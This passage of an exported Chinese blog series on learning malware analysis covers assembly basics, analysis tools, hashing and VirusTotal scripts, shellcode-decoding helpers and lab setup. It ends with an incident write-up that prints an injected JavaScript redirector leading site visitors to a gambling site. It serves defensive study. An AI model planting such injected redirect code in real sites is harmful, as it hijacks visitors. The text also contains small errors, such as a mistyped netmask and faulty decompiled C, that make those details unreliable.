编译器）使用固定ebp堆栈结构去关联函数参数和局部变量。GNU编译器（如gcc）默认不用ebp堆栈结构，而是使用ESP（栈指针）集群器做呗关联函数参数和局部变量。\npop ebp之后将恢复ebp保存在栈中的值，这个操作之后，esp将会+4。再执行了还原函数环境操作之后： 当ret执行之后，返回地址在栈顶，被弹栈到eip寄存器中。控制器返回到主函数执行地址中（在主函数中add esp,8）。在弹栈到返回地址中之后，esp+4。在这点，控制器被控制返回主函数执行。主函数main中的add esp,8用于清理栈，esp返回到最开始的位置（0xFE50）。add esp,8这样的函数称为cdecl传统调用。 大部分C语言编译器都遵循cdecl调用惯例。在cdecl惯例中，调用者将变量以从右到左的规则压栈到栈中，调用者caller自身在调用函数之后清除自身。也有其他调用规则，例如stdcall和fastcall。在stdcall规则中，变量通过caller调用者和callee被调用者从右到左的规则压入栈，调用函数callee负责清理栈。Microsoft windows使用stdcall规则处理被dll文件输出的API函数。在fastcall调用规则中，开始一些参数通过直接存放在寄存器被传递给函数，剩下的所有参数通过以从右到左的方式压入栈中，并且与stdcall类似被调用者callee负责清理栈。（后面会特别的看到64位程序使用fastcall调用规则）\n9 数组和字符串 数组是由相同类型数据组成的一个列表。数组元素在内存中连续存储，便于访问数组中的元素。下面的定义一个含有3个元素的整数型数组，每个元素在内存中占用4字节（因为一个常数是4字节长度）：\nint nums[3]={1,3,4}数组的名是一个指向数组第一个元素的指针常量（数组名指向数组的基址base address）。访问数组需配置相对基址相对地址（原文叫：index）类似nums[1]：\n在汇编中，数组中的任何一个元素的地址计算需要三个东西：\n数组的基址 元素的相对地址 数组中每个元素的大小 高级语言中nums[0]对应转化为汇编的[nums+0*\u003c每个元素的大小字节\u003e]，前面的例子对应的各元素的汇编则为：\nnums[0]=[nums+0*4]=[0x4000+0*4]=[0x4000]=1 nums[1]=[nums+1*4]=[0x4000+1*4]=[0x4004]=3 nums[2]=[nums+2*4]=[0x4000+2*4]=[0x4008]=4一般访问数组元素的形式或公式为： [base_address+index*size of element]\n9.1 数据反汇编挑战 push ebp mov ebp, esp sub esp, 14h mov dword ptr [ebp-14h], 1 mov dword ptr [ebp-10h], 2 mov dword ptr [ebp-0Ch], 3 mov dword ptr [ebp-4], 0 loc_401022: cmp dword ptr [ebp-4], 3 jge loc_40103D mov eax, [ebp-4] mov ecx, [ebp+eax*4-14h] mov [ebp-8], ecx mov edx, [ebp-4] add edx, 1 mov [ebp-4], edx jmp loc_401022 loc_40103D: xor eax, eax mov esp, ebp pop ebp9.2 反汇编解决方法 反汇编：\nint main(){ int num[2]={3,2,1} int b,i for(i=0;i\u003c3;i+1){ b=num[3-i]; } return 0; } 这里汇编for和while语句无区别，可参考在两个c语言for和while循环生成汇编代码之后的区别看出https://my.oschina.net/firebroo/blog/406286 因此反汇编也无区别\n书里是使用的while语句循环做的反汇编：\nint main() { int a[3] = { 1, 2, 3 }; int b, i; i = 0; while (i \u003c 3) { b = a[i]; i++; } return 0; }​ 反汇编分析：\n//---函数开场（非代码）--- push ebp mov ebp, esp //---函数开场结束--- sub esp, 14h //分配局部变量（非代码） //---代码段--- mov dword ptr [ebp-14h], 1 mov dword ptr [ebp-10h], 2 mov dword ptr [ebp-0Ch], 3 mov dword ptr [ebp-4], 0 loc_401022: cmp dword ptr [ebp-4], //循环对比条件 jge loc_40103D //循环结束跳转条件，人工判断loc_40103D为结束循环 mov eax, [ebp-4] //[ebp-4]被初始化为0 mov ecx, [ebp+eax*4-14h] //代表数组内容访问,根据标准格式调整应该为[ebp-14h+eax*4],ebp-14h为数组的基址，数组元素大小为4比特。 mov [ebp-8], ecx mov edx, [ebp-4] //循环变量增加 add edx, 1 mov [ebp-4], edx //循环变量增加结束 jmp loc_401022 //循环语句 loc_40103D: xor eax, eax //---代码段结束--- //---函数结尾清理--- mov esp, ebp pop ebp //---函数结尾清理结束---9.3 字符串 字符是字符数组，当定义一个字符串的时候，一个空终止符（字符串终止符）被加在每个字符串的结尾。每个元素占用内存一个字节（换句话说，每个ASCII码1字节长）。\nchar *str=\"aaaaaaaaaaaaaaaaaa\"字符串名字str是一个纸箱字符串第一个元素的指针（指向字符阵列基址指针）。下图为字符串在内存中的图表： str[0]=[str+0]=[0x4000+0]=[0x4000]=L str[1]=[str+1]=[0x4000+1]=[0x4001]=e str[2]=[str+2]=[0x4000+2]=[0x4002]=t字符串一般表达式：\nstr[i]=[str+i]9.3.1 字符串指令 x86框架的操作系统提供字符操作用于字符串处理。这些命令的步骤通过字符串（字符数组）和加后缀b、w、d等，表示操作的数据的大小（1,2或4字节）。字符串命令使用eax,esi和edi寄存器。eax或者其子寄存器ax,al用于存放数值。寄存器esi作为源地址寄存器（保存源字符串的地址），edi作为目的地址寄存器（用于保存目的字符串地址）。\n执行字符串操作之后，esi和edi急促那期都自动增加或者减少。方向标志位（DF——direction flag）在eflags寄存器决定了esi和edi是否需要增加或减小。cld指令清除方向标志位标志（df=0）；if df=0，则索引寄存器（esi和edi）增加。std指令设置方向标志位标志（df=1）；在这里esi和edi减小。\n9.3.2 移动内存到内存(movsx) movsx指令用于移动一段内存序列从内存一处到另一处。 movsb指令被用于移动1字节数据通过esi寄存器地址移动到指定的edi寄存器地址。 movsw,movsd指令移动2，4字节数据通过esi寄存器地址移动到指定edi寄存器地址。 当数据值被移动，esi和edi寄存器增加或减小基于数据大小的1,2,或4字节。下面是一个例子：\nlea esi,[src] ; \"Good\",0x0 lea edi,[dst] movsb mov —-为数据传送指来令，可以在寄存器（立即数）、内存之间双向传递数据。 lea —-取内存单元自的有效地址指令，只用于传送地址。\n假设地址标签src内容为\"good\"，以空字符(0x0)结尾。在执行第一个命令后，esi将会包含\"good\"的第一个字符的地址（esi指向\"g“所在的地址），第二个指令执行之后，将会设置EDI的内容为dst。第三个语句执行将会复制1字节从esi指向的地址数据到edi指向的地址数据。执行借宿esi和edi都将加1。\n9.3.3 重复指令（rep） movsx指令只能复制1,2，或4字节数据。复制更多字节内容则使用rep指令。rep指令使用ecx寄存器，并且重复执行ecx指定次数的字符串操作指令。下面的汇编代码是复制\"good\"从src到dst：\nlea esi,[src] ; \"Good\",0x0 lea edi,[dst] mov ecx,5 rep movsbrep指令，当使用movsx指令，等效C语言中的memcpy()函数。rep指令有多种形式，并且在执行循环中基于条件允许提前终止。下面的表格内容为不同形式的rep指令和他们含义：\ninstruction condition rep 重复指令直到ecx=0 repe,repz 重复直到ecx=0或者zf=0 repne,repnz 重复直到ecx=0或zf=1 9.3.4. 将寄存器中值存到内存中(stosx) stosb指令用于从CPU的al寄存器中移动1字节的数据到edi指定的内存地址中（目的索引寄存器）。stosw和stosd指令分别用于移动2字节和4字节地址到edi指定的内存地址中。通常stosb指令与rep指令被用于初始化所有缓冲区字节为相同的某值。下面的汇编代码使用5个双字节填充目的缓冲区，值都为0（换句话说初始化了5*4=20字节的内存空间为0）\nmov eax,0 lea edi,[dest] mov ecx,5 rep stosd9.3.5 从内存中加载数据到寄存器中（lodsx） lodsb指令从esi指定的内存地址（源索引寄存器）中加载到al寄存器总。lodsw和lodsd指令是移动2字节和4字节数据从esi指定的内存地址中到ax和eax寄存器中。\n9.3.6 扫描内存（scasx） scasb指令用来搜索或扫描1字节的值在字节序列中存在或者不存在。要搜索的字节存放在al寄存器中，缓存内存地址存放在edi寄存器中。scasb指令常与repne指令（repne scasb）连用，ecx设置缓存长度；重复直到每个字节在al寄存器中找到或直到ecx变为0。\n9.3.7 对比内存中的值（cmpsx） cmpsb指令被用于对比esi指向的内存地址中的1字节值和edi中的值对比，以判断是否是相同的值。cmpsb通常和repe一起用（repe cmpsb)对两个内存缓存；在这种情况下，ecx为缓存的长度，对比将会一直持续到ecx=0或者缓存不相等。\n10 结构 一个结构组是不同种类的数据放在一起；每个结构中的元素成为一个成员。结构体成员通过常量偏移访问。举个便于理解的C语言例子，静态结（simple struct）定义包含三个成员不同数据种类的变量（a,b和c）。主函数main定义结构变量（test_stru），结构体的变量地址（\u0026test_stru）作为第一个参数传递给update函数。在update函数中，成员的值被更新为被指定变量值:\nstruct simpleStruct { int a; short int b; char c; }; void update(struct simpleStruct *test_stru_ptr) { test_stru_ptr-\u003ea = 6; test_stru_ptr-\u003eb = 7; test_stru_ptr-\u003ec = 'A'; } int main() { struct simpleStruct test_stru; ➊ update(\u0026test_stru); ➋ return为了了解结构体成员如何存储，我们考虑update函数的反汇编情况。\npush ebp mov ebp, esp mov eax, [ebp+8] ➌ mov dword ptr [eax], 6 ➍ mov ecx, 7 mov [eax+4], cx ➎ mov byte ptr [eax+6], 41h ➏ mov esp,ebp pop ebp retmov eax,[ebp+8]结构体的基址传递到eax寄存器（注意：ebp+8代表第一个参数；第一个参数代表结构体的基址）。mov dword ptr [eax], 6通过基址加偏移量0指定为第一个成员赋值整数值6（[eax+0]与[eax]相同）。由于整数占用4字节，第二个成员为short in值为7（存储在cx）通过基址+4被指向第二个成员。第三个成员为基址+6传递值为41h（A）。\n通用的结构体成员的地址表达式可以总结为： [base_address+constant_offset]\n结构体与数组在内存中看起来类似，但是需要记住他们指针的区别：\n数组元素的数据都是相同类型的，结构体的成员并不一定都是相同的类型 数组的元素大部分通过基址和变量访问（如[eax+ebx]或[eax+ebx*4]），答案是结构体大部分通过基址及偏移量访问（如[eax+4]） 11. x64架构 x64架构是x86架构的一个扩展和延伸。并且与x86指令设置类似，但是从代码分析的角度有一些不同。这一部分包括x64架构的一些不同点：\n32位（4字节）通用寄存器eax,ebx,ecx,edx,esi,edi,ebp和esp被扩展到64位（8字节）；这些寄存器名字变为rax,rbx,rcx,rdx,rsi,rdi,rbp和rsp。8个新寄存器的名字为r8,r9,r10,r11,r12,r13,r14和r15。一个程序可以以64位（RAX,RBX等），32位（eax,ebx等），16位（ax,bx等）或者8位（al,bl等）访问寄存器。例如，你可以访问RAX寄存器的下半部分作为EAX，RAX的四分之一或更低位作为AX寄存器使用。可以通过在寄存器名字后附加b,w,d或q以字节，字，双字或4字节访问r8-r15。 x64框架可以处理64位（8字节）数据，所有地址和指针都是64位（8字节）大小。 x64位CPU有64位指令指针（rip）包含下一个要执行的指令地址，并且还有64位的标志寄存器（rflags），但是通常只有32位被使用（eflags)。 x64架构支持rip-relative地址。rip寄存器现在可以被用来关联内存位置；你可以在当前指令指针加偏移访问数据。 其他主要的不同是在x86架构中，函数参数被压栈到栈中，因此在x64架构中，前4个函数参数被存放在rcx,rdx,r8,r9寄存器中，如果函数需要额外的寄存器，则他们被存放在栈中。下面是个C的例子： printf(\"%d %d %d %d %d\",1,2,3,4,5)\n32位（x86）中编译，所有的参数都被压倒栈中，在调用pringf之后, add esp,18h清除栈。\npush 5 push 4 push 3 push 2 push 1 push offset Format ; \"%d %d %d %d %d\" call ds:printf add esp, 18h在64位（x64）处理器中编译，在寄存器中分配0x38（56字节）栈空间。前4个变量被存放在rcx,rdx,r8和r9寄存器中。第五和第六个参数被存放在栈中，使用mov dword ptr [rsp+28h], 5; mov dword ptr [rsp+20h], 4。push指令并不会出现在此例子中，这会使判断地址是否是局部变量还是函数参数更困难一些。在这个例子中，字符格式帮助确定printf函数的参数的数量，单数其他情况中中不太容易判断：\nsub rsp, 38h ➊ mov dword ptr [rsp+28h], 5 ➐ mov dword ptr [rsp+20h], 4 ➏ mov r9d, 3 ➎ mov r8d, 2 ➍ mov edx, 1 ➌ lea rcx, Format ; \"%d %d %d %d %d\" ➋ call cs:printf 如果遇到未提及的相关指令则可以参考最新intel 架构手册 https://software.intel.com/en-us/articles/intel-sdm, 指令设置相关 (volumes 2A, 2B, 2C, and 2D) 可以在下面下载https://software.intel.com/sites/default/files/managed/a4/60/325383-sdm-vol-2abcd.pdf.\n11.1 32位可执行程序在64位windows上分析 64操作系统可运行32位可执行程序；实现其功能是通过开发了一个被叫做wow64子系统(windows32位子系统在windows64位操作系统中)。wow64子系统允许32位二进制在64位操作系统中运行。当执行程序是，如果需要加载DLL调用API函数与系统交互。32位执行程序并不会加载64位的DLLs(64位程序也不会调用32位DLLs)，因此微软将DLL分成32位和64位两部分。64位二进制被存储在\\windows\\system32目录下，32位二进制被存放在\\windows\\syswow64目录下。\n在进行了对比之后发现，32位程序在64位windows中运行的行为可能会与原生32位执行的不同。当分析32位恶意样本在64位操作系统中时，可能会发现样本实际上访问的是 system32目录，而不是syswow64目录（操作系统自动重定向syswow64目录）。如果一个32位恶意程序（在64位windows环境下）向\\windows\\system32目录中写入文件，那么需要检查在\\windows\\syswow64目录。因为访问%windir%\\regedit.exe会重定向到%windir%\\SysWOW64\\regedit.exe中。因此会有可能造成分析过程中理解困难，为了避免类似情况最好还是在32位运行32位二进制，64位在64位运行。\nwowo64子系统如何影响你的分析的一文中可以看到更详细的分析http://www.cert.at/static/downloads/papers/cert.at-the_wow_effect.pdf\n12. 其他资源 Learn C: https://www.programiz.com/c-programming C Programming Absolute Beginner’s Guide by Greg Perry and Dean Miller x86 Assembly Programming Tutorial: https://www.tutorialspoint.com/assembly_programming/ Dr. Paul Carter’s PC Assembly Language: http://pacman128.github.io/pcasm/ Introductory Intel x86 - Architecture, Assembly, Applications, and Alliteration: http://opensecuritytraining.info/IntroX86.html Assembly language Step by Step by Jeff Duntemann Introduction to 64-bit Windows Assembly Programming by Ray Seyfarth x86 Disassembly: https://en.wikibooks.org/wiki/X86_Disassembly\n总结 在本章我们了解了汇编语言执行的代码以及必要的技术。并对比了x86和x64的框架区别。反汇编和反编译技巧将会有助于后续的理解样本分析工作。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析4-基础DLL分析",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-5-%E6%B1%87%E7%BC%96%E5%8F%8A%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/index.html"
  },
  {
    "content": "动态分析过程中，当恶意程序执行的时候，需要监控其行为。目标过程的目标是获取恶意程序行为的实时数据，以及其对操作系统的影响。\n本系列主要内容来自《K A, Monnappa. Learning Malware Analysis: Explore the concepts, tools, and techniques to analyze and investigate Windows malware (pp. 95-96). Packt Publishing. Kindle 版本. 》的记录\n动态分析 以下是异形不同种类的监控在动态分析过程中用来获取的信息情况： 进程监控：涉及到监控进程的行为和检查在病毒执行过程中系统性能的影响 文件系统监控：应该包括在恶意软件执行过程中实时文件系统监控 注册表监控：主要包括被恶意软件读写的注册表关键值的访问和改动以及注册表的数据 网络监控：包括在恶意软件执行过程中的实时的网络状态监控 动态分析工具： 进程监控工具： Process Hacker (http://processhacker.sourceforge.net/) 能够用于监控进程变化、网络传输概况、磁盘读写概况等。 进程监控：Process Monitor(https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx)确定系统交互。crtl+E停止抓取事件，ctrl+x清除事件，ctrl+L过滤事件。 系统监控活动：Noriben (https://github.com/Rurik/Noriben)便携式，简单，恶意软件分析沙箱,一般需要配合processmonitor 安装程序监视器：Installspy\nnoriben https://github.com/Rurik/Noriben Noriben是一个基于Python的脚本，与Sysinternals Procmon一起使用，可以自动收集，分析和报告恶意软件的运行时指标。简而言之，它允许您运行应用程序，点击按键，并获得样本活动的简单文本报告。 Noriben不仅允许您运行类似于沙箱的恶意软件，还可以在您以特定方式手动运行恶意软件以使其运行时记录系统范围的事件。例如，它可以在您运行需要不同命令行选项或用户交互的应用程序时进行侦听。或者，在调试器中单步执行应用程序时观察系统。\n虽然Noriben是专为分析恶意软件而设计的，但它也被广泛用于审计正常的软件应用程序。2013年，Tor项目使用它来提供Tor浏览器套件的公共审计\n下面是一个调试VM检查恶意软件的视频，其方式仍然是获取沙箱结果（由于鼠标指针关闭5个像素而导致误点击:)）\nhttps://ghettoforensics.blogspot.com/2013/04/noriben-your-personal-portable-malware.html\n分析步骤 静态分析\n样本字符分析 file virtual分析 动态分析 样本机和监控机启动 windows启动：process hacker、noriben linux启动：inetsim，wireshark 使用管理员身份运行样本40秒左右 停止noriben、inetsim、wireshark 收集检查理解样本行为 ",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析3-基础动态分析",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-3-%E5%9F%BA%E7%A1%80%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": "基础的静态分析可以考虑直接使用各公司平台产品分析产出，这里根据国外的习惯使用一些基本工具脚本进行相关分析的基础工作梳理。\n本系列主要内容来自《K A, Monnappa. Learning Malware Analysis: Explore the concepts, tools, and techniques to analyze and investigate Windows malware (pp. 95-96). Packt Publishing. Kindle 版本. 》的记录\n静态分析 静态分析不执行程序，从二进制文件获取信息。 静态分析主要包含： 识别目标样本框架 恶意文件指纹 使用反病毒引擎扫描可疑二进制文件 提取字符，函数或使用file获取目标相关数据 确定在文件分析过程中的混淆技术 分类对比恶意文件样本\n0x01 确定文件类型 手动方式识别文件类型 工具： Windows systems, HxD hex editor (https://mh-nexus.de/en/hxd/) Linux systems, to look for the file signature, the xxd command can be used.\n工具方式识别文件类型 On Windows, CFF Explorer, part of Explorer Suite (http://www.ntcore.com/exsuite.php), can be used to determine the file type; windows下也可以在网上找到file.exe，通过file进行文件类型识别。 Linux system，the file command can be used.\npython方式识别文件类型 python-magic模块 pip install python-magic\nimport magic figlet =\"\" m=magic.open(magic.MAGIC_NONE) m.load() try: ftype=m.file(sys.argv[1]) print ftype except Exception as e: figlet = '''File type Author XT. ''' print figlet+\"\\nUsage: python filemagic.py \u003cfile\u003e\"Test success on Python 2.7.13 Windows10:\nimport magic import sys,os figlet =\"\" try: file=sys.argv[1] except Exception as e: print \"[Debug]Error :\"+str(e) sys.exit() if os.path.exists(file): try: m=magic.from_file(file) print m except Exception as e: print \"[Debug]Error :\"+str(e) else: figlet = '''File type Author XT. ''' print figlet+\"\\nUsage: python filemagic.py \u003cfile\u003e\" print \"[Error]No such file or directory:\", file sys.exit()0x02 恶意软件指纹 恶意软件的hash 恶意软件释放的新样本的hash\n使用工具获取hash Linux使用the md5sum, sha256sum, and sha1sum windows使用HashMyFiles (http://www.nirsoft.net/utils/hash_my_files.html)\n使用python获取hash import hashlib import sys,os # https://docs.python.org/2/library/hashlib.html try: file=sys.argv[1] except Exception as e: print \"[Debug]Error :\"+str(e) sys.exit() if os.path.exists(file): try: content = open(file,\"rb\").read() print \"md5:\"+hashlib.md5(content).hexdigest() print \"sha1:\"+hashlib.sha1(content).hexdigest() print \"sha256:\"+hashlib.sha256(content).hexdigest() except Exception as e: print \"[Debug]Error :\"+str(e) else: figlet = '''File hash Author XT. ''' print figlet+\"\\nUsage: python filehash.py \u003cfile\u003e\" print \"[Error]No such file or directory:\", file sys.exit()0x03 病毒扫描 virustotal检测 通过多种病毒扫描引擎扫描结果帮助我们更好判断文件样本情况，节约我们分析的时间。 VirusTotal (http://www.virustotal.com) 详情：https://support.virustotal.com/hc/en-us/articles/115005002585-VirusTotal-Graph. https://support.virustotal.com/hc/en-us/articles/115003886005-Private-Services\nimport urllib import urllib2 import json import sys hash_value = sys.argv[1] vt_url = \"https://www.virustotal.com/vtapi/v2/file/report\" api_key = \"\u003cvirustotal api\u003e\" parameters = {'apikey': api_key, 'resource': hash_value} encoded_parameters = urllib.urlencode(parameters) request = urllib2.Request(vt_url, encoded_parameters) response = urllib2.urlopen(request) json_response = json.loads(response.read()) if json_response['response_code']: detections = json_response['positives'] total = json_response['total'] scan_results = json_response['scans'] print \"Detections: %s/%s\" % (detections, total) print \"VirusTotal Results:\" for av_name, av_data in scan_results.items(): print \"\\t%s ==\u003e %s\" % (av_name, av_data['result']) else: print \"No AV Detections For: %s\" % hash_value利用virustotal hunter功能yara规则抓样本 https://bbs.pediy.com/thread-223070.htm\nalienvault检测 使用alienvault进行威胁检测： 开发sdk:(https://github.com/AlienVault-OTX/OTX-Python-SDK) API介绍: (https://otx.alienvault.com/api) sdk中example文件中is_malicious有个已经集成了的用于检测威胁的脚本，可以借助其进行是否存在恶意检测。 https://github.com/AlienVault-OTX/OTX-Python-SDK/blob/master/examples/is_malicious/is_malicious.py\notx.bat\n#!/usr/bin/env python # This script tells if a File, IP, Domain or URL may be malicious according to the data in OTX from OTXv2 import OTXv2 import argparse import get_malicious import hashlib # Your API key API_KEY = '\u003cAPI KEY\u003e' OTX_SERVER = 'https://otx.alienvault.com/' otx = OTXv2(API_KEY, server=OTX_SERVER) parser = argparse.ArgumentParser(description='OTX CLI Example') parser.add_argument('-ip', help='IP eg; 4.4.4.4', required=False) parser.add_argument('-host', help='Hostname eg; www.alienvault.com', required=False) parser.add_argument( '-url', help='URL eg; http://www.alienvault.com', required=False) parser.add_argument( '-hash', help='Hash of a file eg; 7b42b35832855ab4ff37ae9b8fa9e571', required=False) parser.add_argument( '-file', help='Path to a file, eg; malware.exe', required=False) args = vars(parser.parse_args()) if args['ip']: alerts = get_malicious.ip(otx, args['ip']) if len(alerts) \u003e 0: print('Identified as potentially malicious') print(str(alerts)) else: print('Unknown or not identified as malicious') if args['host']: alerts = get_malicious.hostname(otx, args['host']) if len(alerts) \u003e 0: print('Identified as potentially malicious') print(str(alerts)) else: print('Unknown or not identified as malicious') if args['url']: alerts = get_malicious.url(otx, args['url']) if len(alerts) \u003e 0: print('Identified as potentially malicious') print(str(alerts)) else: print('Unknown or not identified as malicious') if args['hash']: alerts = get_malicious.file(otx, args['hash']) if len(alerts) \u003e 0: print('Identified as potentially malicious') print(str(alerts)) else: print('Unknown or not identified as malicious') if args['file']: hash = hashlib.md5(open(args['file'], 'rb').read()).hexdigest() alerts = get_malicious.file(otx, hash) if len(alerts) \u003e 0: print('Identified as potentially malicious') print(str(alerts)) else: print('Unknown or not identified as malicious') 0x04 OFFICE分析 工具包 git clone https://github.com/decalage2/oletools.git 或者这样安装：\nOn Linux/Mac: sudo -H pip install -U oletools On Windows: pip install -U oletools 帮助文档：https://github.com/decalage2/oletools/wiki rtfobj分析 https://github.com/decalage2/oletools/wiki/rtfobj http://decalage.info/rtf_tricks rtf格式判断： 文档内容：“{\\ rtvpn”。通常，RTF文件应以“{\\ rtfN”开头，其中N标识RTF文档的主要版本；\nshellcode 混淆 使用自定义脚本提取关键内容\npaul@lab:~$ cat decode.py #!/usr/bin/python import sys import os file = open(sys.argv[1], 'r') offset = int(sys.argv[2]) key = 0x00 file.seek(offset) while offset \u003c= os.path.getsize(sys.argv[1])-1: data = ord(file.read(1)) ^ key sys.stdout.write(chr(data)) offset = offset+1 key = (key + 1) \u0026 0xFF file.close() paul@lab:~$ cat decode2.py #!/usr/bin/python import sys import os file = sys.stdin sys.stdout.write(file.read(9)) offset = 9 while file: data = file.read(1) if not data: break offset = offset+1 data2 = file.read(1) offset = offset+1 if offset \u003c= 512: sys.stdout.write(data2) sys.stdout.write(data) else: sys.stdout.write(data) sys.stdout.write(data2)参考文章： http://www.sekoia.fr/blog/ms-office-exploit-analysis-cve-2015-1641/ http://www.reconstructer.org/papers.html\n0x05 dns分析 PTR记录反查 http://www.ptrrecord.net/ PTR记录通常用于指向邮件服务器DNS主机A记录，因此其IP与主站IP相同，攻击者通过此记录尝试隐藏域名。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析2-基础静态分析",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-2-%E5%9F%BA%E7%A1%80%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": " 对于日常探针分析工作，样本分析作为不可缺少的一个环节，经常能够在其中发现比较重要的细节，对此部分的学习和总结尤其重要，这一系列即为最近收集总结的一部分。\n本系列主要内容来自《K A, Monnappa. Learning Malware Analysis: Explore the concepts, tools, and techniques to analyze and investigate Windows malware (pp. 95-96). Packt Publishing. Kindle 版本. 》的记录\n1 配置实验环境 Setting Up the lab environment Linux: ubuntu 16.04 desktop Windows: windows 2008\n1.1 Linux Linux after install system: third-party packages:\nsudo apt-get update sudo apt-get install python-pip pip install --upgrade pip python tools: sudo apt-get install python-magic sudo apt-get install upx sudo pip install pefile sudo apt-get install yara sudo pip install yara-python sudo apt-get install ssdeep sudo apt-get install build-essential libffi-dev python python-dev \\ libfuzzy-dev sudo pip install ssdeep sudp apt-get install wireshark sudo apt-get install tshark INetSim(网络状态模拟器)： sudo su echo \"deb http://www.inetsim.org/debian/ binary/\" \u003e/etc/apt/sources.list.d/inetsim.list wget -O - --no-check-certifucate http://www.inetsim.org/inetsim-archive-signing-key.asc | apt-key add - apt update apt-get install inetsim以上安装完毕，labubuntu 切换仅主机模式\nLinuxVM config: 1.配置ubuntu静态网络static IP: 192.168.1.100\nsudo gedit /etc/network/interfaces\nauto lo iface lo inet loopback auto ens33 iface ens33 inet static address 192.168.1.100 netmask 225.255.255.0service networking restart 或者重启ubuntu ifconfig确认\n配置ubuntu中的inetsim配置 修改inetsim默认配置： sudo gedit /etc/inetsim/inetsim.conf 在默认配置service_bind区域追加,并注释掉默认配置： service_bind_address 192.168.1.100配置DNS服务，已用于DNS服务：\n在配置dns区域追加以下内容并注释掉原默认配置： dns_default_ip 192.168.1.100运行测试： sudo inetsim 检查配置\n配置第三方软件： python 2.7 (仅限本书) check point 确认windows主机网段：192.168.1.105 DNS：192.168.1.100 测试win和linux之间联通节点\n1.2 WINDOWS WINDOWS VM config: 主机网络配置：192.168.1.101 DNS:192.168.1.100 关闭Defender（win10/7, win2008没有Windows Defender）: Windows Defender 服务需要在虚拟机禁用掉。运行》gpedit.msc》本地计算机策略》计算机配置》管理模板》windows组件》 Windows Defender（Windows10里面叫“Windows Defender防病毒程序”） 在右边部分双“关闭WindowsDefender策略”关闭Windows Defender防病毒程序。（下图为Win10的图） 配置虚拟机使其允许双向复制粘贴剪切板。 两个虚拟机全部配置完毕，拍摄快照保存初始化状态。此时，linux和windowsVM均配置为Host-Only仅主机模式，并且能够互通。\nwindows安装必要的分析工具 下面是一些可以用来下载恶意文件样本的网站： Hybrid Analysis: https://www.hybrid-analysis.com/ KernelMode.info: http://www.kernelmode.info/forum/viewforum.php?f=16 VirusBay: https://beta.virusbay.io/ Contagio malware dump: http://contagiodump.blogspot.com/ AVCaesar: https://avcaesar.malware.lu/ Malwr: https://malwr.com/ VirusShare: https://virusshare.com/ theZoo: http://thezoo.morirt.com/ 其他恶意软件样本源你可以在下面的博客中找到：You can find links to various other malware sources in Lenny Zeltser’s blog post https://zeltser.com/malware-sample-sources/. 个人收集工具：\n对于在虚拟机中运行的监控类软件还应该注意修改程序名称： wireshark主程序修改入口程序名称可以改变进程名 ",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析1-配置实验环境",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-1-%E9%85%8D%E7%BD%AE%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83/index.html"
  },
  {
    "content": "在此样本中，我们发现该篡改通过在业务页面插入外链的短连接中转JS脚本，通过多级跳转，最终将用户重定向到BoCai网。\n业务页面 ...... \u003cscript language=\"javascript\" src=\"http://t.cn/RBAcEC8\"\u003e\u003c/script\u003e \u003cscript language=\"javascript\" src=\"http://t.cn/RBASXKi\"\u003e\u003c/script\u003e ......观察发现两个短地址： http://t.cn/RBAcEC8 http://t.cn/RBASXKi\n分析短地址： https://www.bcdas8.com/dq.js https://www.bcdas8.com/js301.js\n其中https://www.bcdas8.com/dq.js 判断并回显访问者IP，可被用于记录。 跳转开始： 而另外一个外部JS为多级跳转的开始： https://www.bcdas8.com/js301.js (function () { /*百度推送代码*/ var bp = document.createElement('script'); bp.src = '//push.zhanzhang.baidu.com/push.js'; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(bp, s); /*360推送代码*/ var src = document.location.protocol + '//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9'; document.write('\u003cscript src=\"' + src + '\" id=\"sozz\"\u003e\u003c\\/script\u003e'); })(); var siteAry = new Array(); siteAry[0] = \"https://welcomejs.com/?88\"; siteAry[1] = \"https://welcomejs.com/?88\"; siteAry[2] = \"https://welcomejs.com/?88\"; siteAry[3] = \"https://welcomejs.com/?88\"; var _length = siteAry.length; var myDate = new Date(); var _se = myDate.getSeconds(); var _index = _se%_length; window.location= siteAry[_index];跳转： 分析可知，除了正常的执行百度和360网站统计之外，插入了另外一处跳转： https://welcomejs.com/?88 \u003cmeta http-equiv=\"Content-Language\" content=\"zh-CN\"\u003e \u003cmeta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html; charset=gb2312\"\u003e \u003cmeta http-equiv=\"refresh\" content=\"0.1;url=/zh-cn\"\u003e再次跳转： https://welcomejs.com/zh-cn \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"gb2312\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"\u003e 